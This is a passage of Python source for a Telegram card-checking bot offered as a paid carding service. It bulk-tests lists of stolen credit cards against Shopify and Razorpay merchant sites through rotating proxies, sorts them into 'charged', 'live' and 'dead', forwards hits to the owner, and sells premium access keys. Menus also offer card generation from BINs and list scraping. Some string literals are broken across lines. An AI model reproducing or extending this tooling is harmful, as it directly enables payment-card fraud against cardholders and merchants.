<b>👋 Welcome, {first_name}!</b>
<b>💎 Plan:</b> {plan}
<b>📊 Today Left:</b> <code>{daily_left}</code> CC
━━━━━━━━━━━━━━━━━━━━
<b>🔥 Features:</b>
• Shopify + Razorpay Gates
• Bulk Check up to 100k
• Real-time Progress + Hits
━━━━━━━━━━━━━━━━━━━━
<b>👑 Owner:</b> <a href="tg://user?id={ADMIN_ID}">{OWNER_NAME}</a>
<b>📢 Channel:</b> <a href="{CHANNEL_LINK}">Join Channel</a>
<b>👥 Group:</b> <a href="{GROUP_LINK}">HitByDark</a>"""

    buttons = [
        [Button.inline("🛒 Shopify", b"shopify_tools"), Button.inline("💎 Razorpay", b"rz_tools")],
        [Button.inline("📡 Proxy", b"proxy_tools"), Button.inline("💳 CC Tools", b"cc_tools")],
        [Button.inline("🔑 Plan", b"premium_tools"), Button.inline("📊 Stats", b"bot_stats")],
        [Button.inline("💬 Feedback", b"feedback_menu"), Button.inline("ℹ️ Help", b"help_menu")]
    ]
    if is_admin(user_id):
        buttons.append([Button.inline("🛠 ADMIN PANEL", b"admin_panel")])
    try:
        await event.delete()
    except Exception:
        pass
    await send_start_video(event.chat_id, premium_emoji(welcome), buttons)

# ============================================================
# TOOLS MENUS (rebranded)
# ============================================================
@bot.on(events.CallbackQuery(data=b"shopify_tools"))
async def shopify_tools_menu(event):
    await event.answer()
    text = """<b>🛒 SHOPIFY TOOLS</b>
━━━━━━━━━━━━━━━━━━━━
<code>/site</code> — Check sites
<code>/addsite url</code>
<code>/mysites</code>
<code>/rm url</code>
<code>/clearsites</code>"""
    await event.edit(premium_emoji(text), buttons=[[Button.inline("🔙 Back", b"back_to_start")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"rz_tools"))
async def rz_tools_menu(event):
    await event.answer()
    text = """<b>💎 RAZORPAY TOOLS</b>
━━━━━━━━━━━━━━━━━━━━
<code>/rz card|mm|yy|cvv</code>
<code>/rzchk</code> (reply .txt)
<code>/rzsites</code>
<code>/addrzsites url</code>"""
    await event.edit(premium_emoji(text), buttons=[[Button.inline("🔙 Back", b"back_to_start")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"proxy_tools"))
async def proxy_tools_menu(event):
    await event.answer()
    text = """<b>📡 PROXY TOOLS</b>
━━━━━━━━━━━━━━━━━━━━
<code>/addproxy ip:port</code>
<code>/proxy</code> — Check & clean
<code>/getproxy</code>
<code>/clearproxy</code>
<code>/chkproxy ip:port</code>"""
    await event.edit(premium_emoji(text), buttons=[[Button.inline("🔙 Back", b"back_to_start")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"cc_tools"))
async def cc_tools_menu(event):
    await event.answer()
    text = """<b>💳 CC TOOLS</b>
━━━━━━━━━━━━━━━━━━━━
<code>/gen BIN COUNT</code>
<code>/scrape</code> (reply .txt)
<code>/split 100</code>"""
    await event.edit(premium_emoji(text), buttons=[[Button.inline("🔙 Back", b"back_to_start")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"premium_tools"))
async def premium_tools_menu(event):
    await event.answer()
    text = f"""<b>🔑 PREMIUM</b>
━━━━━━━━━━━━━━━━━━━━
<code>/redeem KEY</code>
<code>/plan</code>
━━━━━━━━━━━━━━━━━━━━
💎 Unlimited checks
💎 Razorpay + Shopify
💎 Bulk up to 100k
━━━━━━━━━━━━━━━━━━━━
📅 7 Days / 30 Days
👑 <a href="tg://user?id={ADMIN_ID}">@{OWNER_USERNAME}</a>"""
    buttons = [
        [Button.url("Buy Plan", f"https://t.me/{OWNER_USERNAME}")],
        [Button.inline("📊 My Plan", b"my_plan")],
        [Button.inline("🔙 Back", b"back_to_start")]
    ]
    await event.edit(premium_emoji(text), buttons=buttons, parse_mode="html")

@bot.on(events.CallbackQuery(data=b"my_plan"))
async def my_plan_handler(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "Unknown"
    except:
        first_name = "Unknown"
    if is_admin(user_id):
        plan_status = "👑 ADMIN"
        expiry = "∞ Lifetime"
        daily = "∞"
    elif is_premium(user_id):
        plan_status = "💎 PREMIUM"
        expiry = "Active"
        daily = "∞"
        try:
            with open(PREMIUM_FILE, "r") as f:
                for line in f:
                    if str(user_id) in line:
                        _, exp = line.strip().split("|")
                        expiry = exp
                        break
        except:
            pass
    else:
        plan_status = "⭐ FREE"
        expiry = "N/A"
        usage = get_daily_usage(user_id)
        daily = f"{usage['cc_count']}/150"
    text = f"""<b>💎 MY PLAN</b>
━━━━━━━━━━━━━━━━━━━━
👤 {first_name}
🆔 <code>{user_id}</code>
💠 {plan_status}
⏳ {expiry}
📊 {daily}
━━━━━━━━━━━━━━━━━━━━
🔑 /redeem KEY
👑 <a href="tg://user?id={ADMIN_ID}">@{OWNER_USERNAME}</a>"""
    await event.edit(premium_emoji(text), buttons=[[Button.inline("🔙 Back", b"premium_tools")]], parse_mode="html")

# ============================================================
# /plan + /redeem + /key (DARKCARDER)
# ============================================================
@bot.on(events.NewMessage(pattern='/plan'))
async def plan_cmd(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "User"
        username = sender.username or "no_username"
    except:
        first_name = "User"
        username = "unknown"
    if is_admin(user_id):
        plan_type = "👑 ADMIN"
        expiry = "∞ Lifetime"
        daily = "∞"
    elif is_premium(user_id):
        plan_type = "💎 PREMIUM"
        expiry = "Active"
        daily = "∞"
        try:
            with open(PREMIUM_FILE, "r") as f:
                for line in f:
                    if str(user_id) in line:
                        _, exp = line.strip().split("|")
                        expiry = exp
                        break
        except:
            pass
    else:
        plan_type = "⭐ FREE"
        expiry = "N/A"
        usage = get_daily_usage(user_id)
        daily = f"{usage['cc_count']}/150"
    msg = f"""⚡💳 <b>{BOT_NAME}</b> 💳⚡
━━━━━━━━━━━━━━━━━━━━
👤 {first_name} (@{username})
🆔 <code>{user_id}</code>
🏷️ {plan_type}
⏳ <code>{expiry}</code>
📊 <code>{daily}</code>
━━━━━━━━━━━━━━━━━━━━
🔑 <code>/redeem KEY</code>
👑 <a href="tg://user?id={ADMIN_ID}">@{OWNER_USERNAME}</a>"""
    await event.reply(premium_emoji(msg), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/redeem\s+(.+)'))
async def redeem_cmd(event):
    user_id = event.sender_id
    key = event.pattern_match.group(1).strip().upper()
    if not key:
        await event.reply(premium_emoji("❌ Usage: <code>/redeem KEY</code>"), parse_mode="html")
        return
    processing = await event.reply(premium_emoji("🔄 <b>Verifying...</b>"), parse_mode="html")
    result = redeem_key(key, user_id)
    if result == "success":
        expiry = "Active"
        try:
            with open(PREMIUM_FILE, "r") as f:
                for line in f:
                    if str(user_id) in line:
                        _, exp = line.strip().split("|")
                        expiry = exp
                        break
        except:
            pass
        try:
            await processing.delete()
        except:
            pass
        await event.reply(premium_emoji(f"""🎉 <b>PREMIUM ACTIVATED!</b>
━━━━━━━━━━━━━━━━━━━━
💎 Status: PREMIUM
👤 <code>{user_id}</code>
⏳ {expiry}
━━━━━━━━━━━━━━━━━━━━
✅ Unlimited + Razorpay + Bulk
👑 <a href="tg://user?id={ADMIN_ID}">{OWNER_NAME}</a>"""), parse_mode="html")
    elif result == "already_premium":
        try:
            await processing.delete()
        except:
            pass
        await event.reply(premium_emoji("⚠️ Already Premium! /plan"), parse_mode="html")
    else:
        try:
            await processing.delete()
        except:
            pass
        await event.reply(premium_emoji(f"❌ Invalid key.\nContact @{OWNER_USERNAME}"), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/key\s+(\d+)\s+(\d+)$'))
async def generate_key_cmd(event):
    if event.sender_id not in KEY_ADMINS:
        await event.reply(premium_emoji("❌ Admins only."), parse_mode="html")
        return
    try:
        count = int(event.pattern_match.group(1))
        days = int(event.pattern_match.group(2))
        if count < 1 or days < 1:
            raise ValueError
    except:
        await event.reply(premium_emoji("❌ Usage: <code>/key 10 30</code>"), parse_mode="html")
        return
    keys = [generate_key(days) for _ in range(count)]
    keys_text = "\n".join([f"<code>{k}</code>" for k in keys])
    msg = f"""✅ <b>{count} KEYS GENERATED ({days} DAYS)</b>
━━━━━━━━━━━━━━━━━
{keys_text}
━━━━━━━━━━━━━━━━━
Prefix: <code>{KEY_PREFIX}-</code>
Redeem: <code>/redeem KEY</code>"""
    await event.reply(premium_emoji(msg), parse_mode="html")

# ============================================================
# /cc + BUTTONS + /chk (core kept, fully rebranded)
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/cc(?:\s|$)'))
async def single_cc_check(event):
    user_id = event.sender_id
    save_user(user_id)
    if is_blocked(user_id):
        await event.reply(premium_emoji("❌ Blocked."), parse_mode="html")
        return
    if not await is_joined_channel(user_id):
        await event.reply(premium_emoji(f"🚫 Join channel first:\n{CHANNEL_LINK}"), parse_mode="html")
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies. /addproxy"), parse_mode="html")
        return
    allowed, _ = check_limits(user_id, False)
    if not allowed:
        await event.reply(premium_emoji("❌ Daily limit. Get Premium."), parse_mode="html")
        return
    text = event.message.text or ""
    parts = text.split(' ', 1)
    if len(parts) < 2:
        await event.reply(premium_emoji("Usage: <code>/cc 5209430225796165|01|27|458</code>"), parse_mode="html")
        return
    cards = extract_cc(parts[1])
    if not cards:
        await event.reply(premium_emoji("❌ Invalid format."), parse_mode="html")
        return
    card = cards[0]
    sites = get_checker_sites(user_id)
    status_msg = await event.reply(premium_emoji("<b>⚡ Checking...</b>"), parse_mode="html")
    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=10)
        update_daily_usage(user_id, 1)
        brand, _, _, bank, country, flag = await get_bin_info(card.split('|')[0])
        gateway = result.get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = result.get("price", "-")
        response_msg = str(result.get('message', ''))[:60]
        status_text = "Charged 💎" if result['status'] == 'Charged' else "Live 🔥" if result['status'] == 'Approved' else "Dead ❌"
        plan = "👑 Admin" if is_admin(user_id) else "💎 Premium" if is_premium(user_id) else "⭐ Free"
        currency = "₹" if "razorpay" in gateway.lower() else "$"
        current_time = get_indian_time()
        try:
            sender = await event.get_sender()
            first_name = sender.first_name or "User"
        except:
            first_name = "User"
        final = f"""[❆] {status_text}
💳 ⤷ <code>{result['card']}</code>
Gate ➳ {gateway} {price}{currency}
──────────
Resp ➳ {response_msg}
Bin ➳ <code>{brand} - {bank} - {country} {flag}</code>
──────────
⏱ ➳ {current_time}
🔗 ➳ <a href="tg://user?id={user_id}">{first_name}</a> [{plan}]
🤩 ➳ <a href="tg://user?id={ADMIN_ID}">{OWNER_NAME}</a>"""
        try:
            await status_msg.delete()
        except:
            pass
        await event.reply(premium_emoji(final), parse_mode="html")
        if result['status'] in ['Charged', 'Approved']:
            await send_hit_to_admin(result, user_id, result['status'])
            await send_realtime_hit_dm(user_id, result, result['status'], first_name)
            update_stats(total_charged=1 if result['status'] == 'Charged' else 0, total_approved=1 if result['status'] == 'Approved' else 0)
    except Exception as e:
        try:
            await status_msg.edit(premium_emoji(f"❌ {str(e)[:80]}"), parse_mode="html")
        except:
            await event.reply(premium_emoji(f"❌ {str(e)[:80]}"), parse_mode="html")

@bot.on(events.CallbackQuery(pattern=b"live_"))
async def live_button_handler(event):
    user_id = event.sender_id
    now = time.time()
    if user_id in last_click and (now - last_click[user_id]) < 30:
        await event.answer(f"⏳ Wait {int(30 - (now - last_click[user_id]))}s", alert=True)
        return
    last_click[user_id] = now
    msg_id = int(event.data.decode().split("_")[1])
    session_key = f"{user_id}_{msg_id}"
    if session_key not in active_sessions:
        session_key = f"rz_{user_id}_{msg_id}"
    cards = active_sessions.get(session_key, {}).get('results', {}).get('approved', [])
    if not cards:
        await event.answer("❌ No live cards!", alert=True)
        return
    await send_card_file(user_id, cards, "LIVE 🔥", "live")
    await event.answer(f"✅ {len(cards)} live sent!", alert=True)

@bot.on(events.CallbackQuery(pattern=b"charged_"))
async def charged_button_handler(event):
    user_id = event.sender_id
    now = time.time()
    if user_id in last_click and (now - last_click[user_id]) < 30:
        await event.answer(f"⏳ Wait {int(30 - (now - last_click[user_id]))}s", alert=True)
        return
    last_click[user_id] = now
    msg_id = int(event.data.decode().split("_")[1])
    session_key = f"{user_id}_{msg_id}"
    if session_key not in active_sessions:
        session_key = f"rz_{user_id}_{msg_id}"
    cards = active_sessions.get(session_key, {}).get('results', {}).get('charged', [])
    if not cards:
        await event.answer("❌ No charged!", alert=True)
        return
    await send_card_file(user_id, cards, "CHARGED 💎", "charged")
    await event.answer(f"✅ {len(cards)} charged sent!", alert=True)

@bot.on(events.CallbackQuery(pattern=b"dead_"))
async def dead_button_handler(event):
    user_id = event.sender_id
    now = time.time()
    if user_id in last_click and (now - last_click[user_id]) < 30:
        await event.answer(f"⏳ Wait {int(30 - (now - last_click[user_id]))}s", alert=True)
        return
    last_click[user_id] = now
    msg_id = int(event.data.decode().split("_")[1])
    session_key = f"{user_id}_{msg_id}"
    if session_key not in active_sessions:
        session_key = f"rz_{user_id}_{msg_id}"
    cards = active_sessions.get(session_key, {}).get('results', {}).get('dead', [])
    if not cards:
        await event.answer("❌ No dead!", alert=True)
        return
    await send_card_file(user_id, cards, "DEAD ❌", "dead", is_dead=True)
    await event.answer(f"✅ {len(cards)} dead sent!", alert=True)

@bot.on(events.CallbackQuery(pattern=b"stop_"))
async def stop_handler(event):
    user_id = event.sender_id
    try:
        msg_id = int(event.data.decode().split("_")[1])
    except:
        msg_id = event.message_id
    session_key = f"{user_id}_{msg_id}"
    if session_key not in active_sessions:
        session_key = f"rz_{user_id}_{msg_id}"
    await event.answer("🛑 Stopping...", alert=True)
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await asyncio.sleep(1.5)
        try:
            await send_final_results(user_id, active_sessions[session_key].get('results', {}))
        except:
            pass
        if session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await event.edit(premium_emoji("🛑 <b>Stopped!</b>"), parse_mode="html")
        except:
            pass
    else:
        await event.answer("No session!", alert=True)

@bot.on(events.CallbackQuery(pattern=b"copycc_"))
async def copy_cc_handler(event):
    try:
        cc = event.data.decode('utf-8').split("_", 1)[1]
        await event.answer(f"✅ Copied!\n\n{cc}", alert=True)
    except:
        await event.answer("❌ Failed", alert=True)

# ============================================================
# /chk core (same structure, rebranded messages)
# ============================================================
@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id
    save_user(user_id)
    if user_id in user_check_locks:
        await event.reply(premium_emoji("⚠️ Already checking!"), parse_mode="html")
        return
    if not is_admin(user_id) and not is_premium(user_id):
        await event.reply(premium_emoji(f"""🔒 <b>PREMIUM ONLY</b>
━━━━━━━━━━━━━━━━━━━━
👑 <a href="tg://user?id={ADMIN_ID}">@{OWNER_USERNAME}</a>"""), parse_mode="html")
        return
    if not await is_joined_channel(user_id):
        await event.reply(premium_emoji(f"🚫 Join:\n{CHANNEL_LINK}"), parse_mode="html")
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to .txt"), parse_mode="html")
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg or not reply_msg.file or not str(reply_msg.file.name).endswith('.txt'):
        await event.reply(premium_emoji("❌ Only .txt"), parse_mode="html")
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.reply(premium_emoji("❌ /addproxy first"), parse_mode="html")
        return
    status_msg = await event.reply(premium_emoji("🔄 Loading..."), parse_mode="html")
    user_sites = get_user_sites_sync(user_id)
    global_sites = load_sites()
    await status_msg.edit(
        premium_emoji("<b>🔄 Select Sites</b>"),
        buttons=[
            [Button.inline("🟢 MY SITES", f"chk_my_{status_msg.id}".encode()),
             Button.inline("🔵 BOT SITES", f"chk_global_{status_msg.id}".encode())],
            [Button.inline("❌ CANCEL", f"cancel_chk_{status_msg.id}".encode())]
        ],
        parse_mode="html"
    )
    active_sessions[f"chk_{user_id}_{status_msg.id}"] = {
        'user_id': user_id, 'reply_msg': reply_msg,
        'user_sites': user_sites, 'global_sites': global_sites, 'proxies': proxies
    }

@bot.on(events.CallbackQuery(pattern=rb"chk_my_(\d+)"))
async def chk_my_sites_handler(event):
    user_id = event.sender_id
    msg_id = int(event.pattern_match.group(1).decode())
    session_key = f"chk_{user_id}_{msg_id}"
    if session_key not in active_sessions:
        await event.answer("❌ Expired", alert=True)
        return
    data = active_sessions[session_key]
    sites = data['user_sites']
    if not sites:
        await event.answer("❌ No personal sites", alert=True)
        return
    await event.answer(f"✅ {len(sites)} sites", alert=True)
    try:
        await event.delete()
    except:
        pass
    asyncio.create_task(run_chk(data, sites))

@bot.on(events.CallbackQuery(pattern=rb"chk_global_(\d+)"))
async def chk_global_sites_handler(event):
    user_id = event.sender_id
    msg_id = int(event.pattern_match.group(1).decode())
    session_key = f"chk_{user_id}_{msg_id}"
    if session_key not in active_sessions:
        await event.answer("❌ Expired", alert=True)
        return
    data = active_sessions[session_key]
    sites = data['global_sites']
    if not sites:
        await event.answer("❌ No bot sites", alert=True)
        return
    await event.answer(f"✅ {len(sites)} bot sites", alert=True)
    try:
        await event.delete()
    except:
        pass
    asyncio.create_task(run_chk(data, sites))

@bot.on(events.CallbackQuery(pattern=rb"cancel_chk_(\d+)"))
async def cancel_chk_handler(event):
    msg_id = int(event.pattern_match.group(1).decode())
    await event.answer("❌ Cancelled", alert=True)
    try:
        await event.delete()
    except:
        pass
    for key in list(active_sessions.keys()):
        if str(msg_id) in key:
            del active_sessions[key]

async def run_chk(data, sites):
    user_id = data['user_id']
    reply_msg = data['reply_msg']
    proxies = load_user_proxies(user_id)
    if user_id in user_check_locks:
        await bot.send_message(user_id, premium_emoji("⚠️ Already checking!"), parse_mode="html")
        return
    user_check_locks[user_id] = f"{user_id}_{int(time.time())}"
    try:
        status_msg = await bot.send_message(user_id, premium_emoji("🔄 Processing..."), parse_mode="html")
        file_path = await reply_msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = extract_cc(content)
        try:
            os.remove(file_path)
        except:
            pass
        if not cards:
            await status_msg.edit(premium_emoji("❌ No cards"), parse_mode="html")
            return
        is_admin_user = is_admin(user_id)
        is_prem_user = is_premium(user_id)
        if is_admin_user:
            cards = cards[:1000000]
        elif is_prem_user:
            cards = cards[:10000]
        else:
            cards = cards[:2000]
        total_cards = len(cards)
        await status_msg.edit(premium_emoji(f"🚀 Starting {total_cards} cards..."), parse_mode="html")
        session_key = f"{user_id}_{status_msg.id}"
        all_results = {'charged': [], 'approved': [], 'dead': [], 'error_cards': [], 'errors': 0, 'api_errors': 0, 'total': total_cards, 'checked': 0, 'start_time': time.time()}
        active_sessions[session_key] = {'paused': False, 'results': all_results}
        try:
            sender = await bot.get_entity(user_id)
            username = sender.username or f"user_{user_id}"
        except:
            username = f"user_{user_id}"
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        last_update = [time.time()]
        async def worker():
            while not queue.empty() and session_key in active_sessions:
                if active_sessions[session_key].get('paused'):
                    await asyncio.sleep(0.3)
                    continue
                try:
                    card = await asyncio.wait_for(queue.get(), timeout=0.5)
                except:
                    continue
                res = await check_card_with_retry(card, sites, proxies, max_retries=8)
                all_results['checked'] += 1
                all_results['last_result'] = res
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    asyncio.create_task(send_hit_to_admin(res, user_id, "Charged"))
                    asyncio.create_task(send_realtime_hit_dm(user_id, res, 'Charged', username))
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    asyncio.create_task(send_hit_to_admin(res, user_id, "Approved"))
                    asyncio.create_task(send_realtime_hit_dm(user_id, res, 'Approved', username))
                else:
                    all_results['dead'].append(res)
                    if res['status'] == 'Site Error':
                        all_results['error_cards'].append(res)
                        all_results['errors'] += 1
                queue.task_done()
                if all_results['checked'] % 8 == 0 or all_results['checked'] == total_cards:
                    if time.time() - last_update[0] >= 1.2:
                        last_update[0] = time.time()
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'], first_name=username)
                        except:
                            pass
        worker_count = 150 if (is_admin_user or is_prem_user) else 50
        workers = [asyncio.create_task(worker()) for _ in range(worker_count)]
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'], first_name=username)
            await send_final_results(user_id, all_results)
    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"❌ {str(e)[:100]}"), parse_mode="html")
    finally:
        if user_id in user_check_locks:
            del user_check_locks[user_id]
        if session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await status_msg.delete()
        except:
            pass

# ============================================================
# PROXY COMMANDS (/addproxy /getproxy /clearproxy /proxy /chkproxy)
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/addproxy(?:\s|$)([\s\S]*)'))
async def addproxy_cmd(event):
    user_id = event.sender_id
    if not is_admin(user_id) and not is_premium(user_id):
        await event.reply(premium_emoji("🔒 Premium only"), parse_mode="html")
        return
    text = event.pattern_match.group(1).strip() if event.pattern_match else ""
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    if not lines:
        # also check reply
        if event.reply_to_msg_id:
            reply = await event.get_reply_message()
            if reply and reply.text:
                lines = [l.strip() for l in reply.text.splitlines() if l.strip()]
    if not lines:
        await event.reply(premium_emoji(
            "❌ Usage:
<code>/addproxy ip:port</code>
"
            "<code>/addproxy user:pass@ip:port</code>
"
            "or reply to a proxy list .txt"
        ), parse_mode="html")
        return
    added = []
    skipped = []
    data = load_json(USER_PROXY_FILE, {})
    user_proxies = data.get(str(user_id), [])
    for line in lines:
        if line.startswith("http://") or line.startswith("https://") or line.startswith("socks"):
            proxy = line
        elif "@" in line:
            proxy = f"http://{line}"
        elif line.count(":") >= 3:
            parts = line.split(":")
            host, port, user, passwd = parts[0], parts[1], parts[2], ":".join(parts[3:])
            proxy = f"http://{user}:{passwd}@{host}:{port}"
        elif line.count(":") == 1:
            proxy = f"http://{line}"
        else:
            skipped.append(line)
            continue
        if proxy not in user_proxies:
            user_proxies.append(proxy)
            added.append(proxy)
        else:
            skipped.append(line)
    data[str(user_id)] = user_proxies
    save_json(USER_PROXY_FILE, data)
    msg = f"✅ <b>Added {len(added)} proxy(ies)</b>
"
    if skipped:
        msg += f"⚠️ Skipped {len(skipped)} (duplicate/invalid)"
    await event.reply(premium_emoji(msg), parse_mode="html")

@bot.on(events.NewMessage(pattern='/getproxy'))
async def getproxy_cmd(event):
    user_id = event.sender_id
    if not is_admin(user_id) and not is_premium(user_id):
        await event.reply(premium_emoji("🔒 Premium only"), parse_mode="html")
        return
    data = load_json(USER_PROXY_FILE, {})
    user_proxies = data.get(str(user_id), [])
    all_proxies = user_proxies if user_proxies else load_proxies()
    if not all_proxies:
        await event.reply(premium_emoji("❌ No proxies"), parse_mode="html")
        return
    text = f"<b>📡 Proxies ({len(all_proxies)})</b>
━━━━━━━━━━━━━━━━━━━━
"
    for p in all_proxies[:20]:
        text += f"<code>{p}</code>
"
    if len(all_proxies) > 20:
        text += f"
...and {len(all_proxies) - 20} more"
    await event.reply(premium_emoji(text), parse_mode="html")

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clearproxy_cmd(event):
    user_id = event.sender_id
    if not is_admin(user_id) and not is_premium(user_id):
        await event.reply(premium_emoji("🔒 Premium only"), parse_mode="html")
        return
    data = load_json(USER_PROXY_FILE, {})
    if str(user_id) in data:
        del data[str(user_id)]
        save_json(USER_PROXY_FILE, data)
        await event.reply(premium_emoji("✅ Proxies cleared. Bot will use default proxies."), parse_mode="html")
    else:
        await event.reply(premium_emoji("ℹ️ No personal proxies set"), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/proxy$'))
async def proxy_status_cmd(event):
    user_id = event.sender_id
    data = load_json(USER_PROXY_FILE, {})
    user_proxies = data.get(str(user_id), [])
    all_proxies = load_proxies()
    text = f"""<b>📡 PROXY STATUS</b>
━━━━━━━━━━━━━━━━━━━━
<b>Your proxies:</b> <code>{len(user_proxies)}</code>
<b>Bot proxies:</b> <code>{len(all_proxies)}</code>
━━━━━━━━━━━━━━━━━━━━
<code>/addproxy ip:port</code>
<code>/getproxy</code> — list yours
<code>/clearproxy</code> — reset to bot default
<code>/chkproxy ip:port</code> — test one proxy"""
    await event.reply(premium_emoji(text), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/chkproxy(?:\s|$)(.*)'))
async def chkproxy_cmd(event):
    user_id = event.sender_id
    proxy_str = (event.pattern_match.group(1) or "").strip()
    if not proxy_str:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port</code>"), parse_mode="html")
        return
    if not proxy_str.startswith("http"):
        proxy_str = f"http://{proxy_str}"
    msg = await event.reply(premium_emoji("⏳ Testing proxy..."), parse_mode="html")
    try:
        connector = ProxyConnector.from_url(proxy_str)
        timeout = aiohttp.ClientTimeout(total=10)
        start = time.time()
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get("http://ip-api.com/json") as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    elapsed = round((time.time() - start) * 1000)
                    country = data.get("country", "?")
                    ip = data.get("query", proxy_str)
                    isp = data.get("isp", "?")
                    await msg.edit(premium_emoji(
                        f"✅ <b>Proxy ALIVE</b>
"
                        f"🌍 {country} | {ip}
"
                        f"🏢 {isp}
"
                        f"⚡ {elapsed}ms"
                    ), parse_mode="html")
                else:
                    await msg.edit(premium_emoji(f"❌ Proxy returned HTTP {resp.status}"), parse_mode="html")
    except Exception as e:
        await msg.edit(premium_emoji(f"❌ Dead: <code>{str(e)[:100]}</code>"), parse_mode="html")

# ============================================================
# ADMIN COMMANDS (block / unblock / users / Note)
# ============================================================
@bot.on(events.NewMessage(pattern=r'^/block\s+(\d+)'))
async def block_user_cmd(event):
    if event.sender_id not in KEY_ADMINS:
        return
    try:
        target = int(event.pattern_match.group(1))
    except:
        await event.reply(premium_emoji("❌ /block USER_ID"), parse_mode="html")
        return
    if target == event.sender_id or target in KEY_ADMINS:
        await event.reply(premium_emoji("❌ Can't block admin"), parse_mode="html")
        return
    block_user(target)
    await event.reply(premium_emoji(f"🚫 Blocked <code>{target}</code>"), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/unblock\s+(\d+)'))
async def unblock_user_cmd(event):
    if event.sender_id not in KEY_ADMINS:
        return
    try:
        target = int(event.pattern_match.group(1))
    except:
        await event.reply(premium_emoji("❌ /unblock USER_ID"), parse_mode="html")
        return
    unblock_user(target)
    await event.reply(premium_emoji(f"✅ Unblocked <code>{target}</code>"), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/blocklist$'))
async def block_list_cmd(event):
    if event.sender_id not in KEY_ADMINS:
        return
    blocked = get_blocked_users()
    if not blocked:
        await event.reply(premium_emoji("📋 Empty"), parse_mode="html")
        return
    text = "\n".join([f"<code>{uid}</code>" for uid in blocked])
    await event.reply(premium_emoji(f"<b>🚫 BLOCKED ({len(blocked)})</b>\n{text}"), parse_mode="html")

@bot.on(events.NewMessage(pattern='/users'))
async def show_users(event):
    if not is_admin(event.sender_id):
        return
    status = await event.reply(premium_emoji("⏳ Fetching..."), parse_mode="html")
    users = []
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users")
        rows = cursor.fetchall()
        conn.close()
        for row in rows:
            uid = row[0]
            try:
                entity = await bot.get_entity(uid)
                first_name = entity.first_name or "Unknown"
                username = entity.username or "No Username"
                status_u = "👑 ADMIN" if is_admin(uid) else "💎 PREMIUM" if is_premium(uid) else "⭐ FREE"
                users.append(f"{status_u} | {uid} | {first_name} | @{username}")
            except:
                users.append(f"❓ | {uid} | Unknown")
    except Exception as e:
        await status.edit(premium_emoji(f"❌ {e}"), parse_mode="html")
        return
    if not users:
        await status.edit(premium_emoji("❌ No users"), parse_mode="html")
        return
    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"ʜ ᴇ ʟ ᴇ x メ_Users_{timestamp}.txt"
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write(f"{BOT_NAME} USERS\n" + "\n".join(users))
    await status.edit(premium_emoji(f"<b>👥 {len(users)} Users</b>"), parse_mode="html")
    await bot.send_file(event.sender_id, file=filename, caption="📋 Users List")
    try:
        os.remove(filename)
    except:
        pass

@bot.on(events.NewMessage(pattern=r'^/Note(?:\s|$)([\s\S]*)'))
async def notice_to_all(event):
    if not is_admin(event.sender_id):
        return
    notice_text = event.pattern_match.group(1).strip()
    if not notice_text:
        await event.reply(premium_emoji("❌ /Note message"), parse_mode="html")
        return
    users = []
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users")
        users = [r[0] for r in cursor.fetchall()]
        conn.close()
    except:
        pass
    if not users:
        await event.reply(premium_emoji("❌ No users"), parse_mode="html")
        return
    notice_msg = f"""<b>📢 OFFICIAL NOTICE</b>
━━━━━━━━━━━━━━━━━━━━
{notice_text}
━━━━━━━━━━━━━━━━━━━━
🤖 {BOT_NAME}
👑 <a href="tg://user?id={ADMIN_ID}">{OWNER_NAME}</a>"""
    status = await event.reply(premium_emoji(f"📤 Sending to {len(users)}..."), parse_mode="html")
    sent = failed = 0
    for uid in users:
        try:
            await bot.send_message(uid, premium_emoji(notice_msg), parse_mode="html")
            sent += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1
    await status.edit(premium_emoji(f"✅ Sent: {sent} | ❌ Failed: {failed}"), parse_mode="html")

# ============================================================
